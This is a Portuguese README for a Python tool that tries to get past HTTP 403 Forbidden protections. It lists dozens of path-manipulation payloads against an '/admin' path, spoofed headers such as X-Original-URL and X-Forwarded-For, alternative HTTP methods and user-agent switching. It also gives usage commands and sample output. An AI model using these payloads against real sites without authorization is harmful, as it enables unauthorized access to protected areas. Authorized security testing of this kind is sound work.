# Ferramenta de Bypass 403 🔓

Uma ferramenta Python poderosa e versátil desenvolvida para ajudar pesquisadores de segurança a testar vulnerabilidades de bypass em respostas 403 Forbidden. Com mais de 80 técnicas diferentes implementadas, esta ferramenta tenta automaticamente diversos métodos para contornar proteções 403 Forbidden, incluindo manipulação de caminhos, falsificação de cabeçalhos HTTP, diferentes métodos HTTP e alternância de User-Agent.

## 🚀 Funcionalidades

<table>
<tr>
<td width="50%">

### 🧪 Técnicas de Bypass

- **80+ Técnicas de Manipulação de Caminhos**
  - Técnicas básicas e avançadas de URL
  - Codificação URL e fragmentos
  - Manipulação de case e caracteres especiais
- **15+ Técnicas de Falsificação de Cabeçalhos HTTP**
  - X-Original-URL, X-Rewrite-URL
  - Cabeçalhos de IP e redirecionamento
  - Headers de autenticação e autorização
- **10 Métodos HTTP Diferentes**
  - GET, POST, PUT, DELETE, PATCH
  - OPTIONS, TRACE, CONNECT, HEAD, PROPFIND
- **11 User-Agents Diferentes**
  - Navegadores desktop e móveis
  - Crawlers de mecanismos de busca
  - Bots de redes sociais

</td>
<td width="50%">

### 🛠️ Recursos de Usabilidade

- **Processamento Paralelo Multi-threading**
  - Configurável de 1 a 100+ threads
  - Otimizado para velocidade sem sobrecarga
- **Interface Colorida com Formatação Avançada**
  - Resultados com código de cores por status
  - Destaque visual para bypasses bem-sucedidos
  - Banner ASCII personalizado
- **Detecção Inteligente**
  - Verificação automática de status inicial
  - Filtragem inteligente de resultados 403
  - **Detecção de falsos positivos por tamanho**
  - **Ocultação automática de respostas repetitivas**
- **Suporte à Wayback Machine**
  - Verificação de snapshots históricos
  - Detecção de permissões anteriores

</td>
</tr>
</table>

## 📋 Instalação

```bash
# Clone o repositório
git clone https://github.com/seu-usuario/403-bypass.git
cd 403-bypass

# Instale as dependências necessárias
pip install -r requirements.txt
```

## 🔧 Uso

### Uso Básico

```bash
python bypass.py http://exemplo.com/caminho-proibido
```

### Opções Avançadas

```bash
python bypass.py http://exemplo.com/admin -t 20 --user-agents --methods -v -o resultados.txt
```

### Argumentos de Linha de Comando

| Opção | Descrição |
|--------|-------------|
| `url` | URL alvo (obrigatório) |
| `-t, --threads` | Número de threads concorrentes (padrão: 10) |
| `-v, --verbose` | Exibe saída detalhada |
| `-o, --output` | Salva resultados em arquivo |
| `--timeout` | Tempo limite da requisição em segundos (padrão: 5) |
| `--no-color` | Desativa saída colorida |
| `--no-wayback` | Pula verificação no Wayback Machine |
| `--user-agents` | Testa diferentes user agents |
| `--methods` | Testa diferentes métodos HTTP |

## 🛡️ Técnicas de Bypass

### Manipulação de Caminhos

A ferramenta testa mais de 80 técnicas de manipulação de caminhos para contornar proteções 403, incluindo:

<table>
<tr>
  <td><b>Técnicas Básicas</b></td>
  <td><b>Manipulação de URL</b></td>
  <td><b>Codificação URL</b></td>
  <td><b>Caracteres Especiais</b></td>
</tr>
<tr>
<td>

```
/admin
/admin/.
/admin%20
/admin%09
/admin?
/admin.html
/admin/?anything
/admin#
/admin/*
/admin.php
/admin.json
/admin..;/
/admin;/
```

</td>
<td>

```
//admin//
///admin///
./admin/./
/admin//
/admin/?
/admin??
/admin/?/
/admin/??
/admin/??/
/admin/..
/admin/../
/admin/./
/admin/.
/admin/.//
```

</td>
<td>

```
/admin/%2f
/admin/%2f/
/admin/%20
/admin/%20/
/admin/%09
/admin/%09/
/admin/%0a
/admin/%0a/
/admin/%0d
/admin/%0d/
/admin/%25
/admin/%25/
```

</td>
<td>

```
/admin/#
/admin/#/
/admin/#/./
./admin
./admin/
..;/admin
..;/admin/
.;/admin
.;/admin/
;/admin
;/admin/
```

</td>
</tr>
<tr>
  <td><b>Manipulações Avançadas</b></td>
  <td><b>Fragmentos e Caracteres</b></td>
  <td><b>Extensões de Arquivo</b></td>
  <td><b>Manipulação de Case</b></td>
</tr>
<tr>
<td>

```
/admin/./
%2e/admin
%2e/admin/
%20/admin/%20
%20/admin/%20/
/admin/..;/
/admin..;/
/admin;/
/admin%00
```

</td>
<td>

```
/admin/~
/admin~
/admin/°/
/admin/&
/admin/-
/admin\/\/
/admin/..%3B/
/admin/;%2f..%2f..%2f
```

</td>
<td>

```
/admin.json
/admin/.json
/admin.css
/admin.html
/admin?id=1
```

</td>
<td>

```
/ADMIN
/ADMIN/
/admin/..\;/
*/admin
*/admin/
/ADM+IN
/ADM+IN/
```

</td>
</tr>
</table>

### Cabeçalhos HTTP

Testa vários cabeçalhos HTTP que podem contornar controles de acesso:

- `X-Original-URL`
- `X-Rewrite-URL`
- `X-Forwarded-For`
- `X-Forwarded-Host`
- `X-Host`
- `X-Custom-IP-Authorization`
- Além de muitos outros que podem enganar o servidor, fazendo-o acreditar que a requisição está vindo de uma fonte autorizada

### Métodos HTTP

Testa métodos HTTP alternativos que podem ter diferentes controles de acesso:

- GET, POST, PUT, DELETE, PATCH
- OPTIONS, TRACE, CONNECT, HEAD
- PROPFIND (WebDAV)

### Falsificação de User-Agent

Testa diferentes user agents incluindo:

- Navegadores desktop (Chrome, Firefox, Safari)
- Navegadores móveis (iPhone, iPad)
- Crawlers de mecanismos de busca (Googlebot, Bingbot)
- Crawlers de redes sociais (Facebook)

## 📊 Detecção Inteligente de Falsos Positivos

A ferramenta inclui um sistema avançado para identificar e filtrar falsos positivos, tornando os resultados mais precisos:

- **Ocultação de Respostas 403**: Todas as respostas 403 são completamente ocultadas para reduzir o ruído na saída
- **Detecção de Padrões de Resposta**: A ferramenta rastreia automaticamente o tamanho das respostas de sucesso
- **Filtragem de Falsos Positivos**: Quando várias respostas têm exatamente o mesmo tamanho, a ferramenta filtra automaticamente após as primeiras ocorrências
- **Análise de Consistência**: Se muitas respostas têm tamanho idêntico, a ferramenta emite um alerta inteligente sugerindo falsos positivos
- **Melhor Identificação de Bypass Reais**: Este sistema ajuda a distinguir entre redirecionamentos genéricos e verdadeiros bypasses

Este recurso é particularmente útil para testar sites modernos que podem retornar uma página de erro ou login genérica com status 200 em vez de um erro 403 tradicional.

## 📊 Exemplo de Saída

<p align="center">
  <img src="https://github.com/seu-usuario/403-bypass/assets/exemplo-saida.png" alt="Exemplo de saída do 403 Bypass Tool" width="700">
</p>

```
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                                                             ┃
    ┃   ██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗██████╗    ┃
    ┃   ██║  ██║██╔═██╗██║██╔═══██╗   ██╔══██╗╚██╗ ██╔╝██╔══██╗   ┃
    ┃   ███████║██║██╔██║██║   ██║   ██████╔╝ ╚████╔╝ ██████╔╝   ┃
    ┃   ╚════██║████╔╝██║██║   ██║   ██╔══██╗  ╚██╔╝  ██╔═══╝    ┃
    ┃        ██║╚██████╔╝╚██████╔╝   ██████╔╝   ██║   ██║        ┃
    ┃        ╚═╝ ╚═════╝  ╚═════╝    ╚═════╝    ╚═╝   ╚═╝        ┃
    ┃                                                             ┃
    ┃                  403 FORBIDDEN BYPASS TOOL                  ┃
    ┃                                                             ┃
    ┃              [ Created by Security Researcher ]             ┃
    ┃                      [ Version 2.0 ]                        ┃
    ┃                                                             ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

================================================================================
[+] Target: http://exemplo.com/admin
[+] Starting bypass tests with 10 threads...
================================================================================

[*] Performing initial request to check server response...
[*] Initial response: 403, 1528 bytes

[+] POSSIBLE BYPASS FOUND:
    URL: http://exemplo.com//admin//
    Status: 200 OK
    Size: 8721 bytes
    Technique: //admin//

[+] POSSIBLE BYPASS FOUND:
    URL: http://exemplo.com/admin/.json
    Status: 200 OK
    Size: 6453 bytes
    Technique: admin/.json

[+] POSSIBLE BYPASS FOUND:
    URL: http://exemplo.com/ADMIN
    Status: 200 OK
    Size: 8721 bytes
    Technique: ADMIN

[!] Warning: Many responses (12) have the same size (8721 bytes).
    This may indicate false positives due to a generic response page.
    Consider manually verifying any bypasses with this response size.

[Wayback Machine] Archive found:
{
  "url": "http://exemplo.com/admin",
  "timestamp": "20220315185642",
  "status": "200",
  "available": true
}

================================================================================
Summary: 7 successful bypass attempts out of 87 tests
================================================================================

Results saved to resultados.txt
```

## 🔍 Aplicações Práticas

- **Testes de Segurança**: Teste aplicações web para vulnerabilidades de controle de acesso
- **Bug Bounty Hunting**: Identifique problemas de bypass 403 em programas de bug bounty
- **Teste de Penetração**: Avalie a segurança de configurações de servidores web
- **Pesquisa de Segurança**: Experimente com diferentes técnicas de bypass

## ⚠️ Aviso Legal

Esta ferramenta é fornecida apenas para fins educacionais e testes de segurança autorizados. Sempre obtenha permissão adequada antes de testar qualquer site ou aplicação. O autor não se responsabiliza por qualquer uso indevido ou dano causado por esta ferramenta.

## 📜 Licença

Este projeto está licenciado sob a Licença MIT - veja o arquivo LICENSE para detalhes.

## 🤝 Contribuindo

Contribuições, problemas e solicitações de recursos são bem-vindos! Sinta-se à vontade para verificar a [página de issues](https://github.com/seu-usuario/403-bypass/issues).

1. Faça um fork do repositório
2. Crie sua branch de recurso (`git checkout -b recurso/recurso-incrivel`)
3. Faça commit de suas alterações (`git commit -m 'Adiciona um recurso incrível'`)
4. Faça push para a branch (`git push origin recurso/recurso-incrivel`)
5. Abra um Pull Request
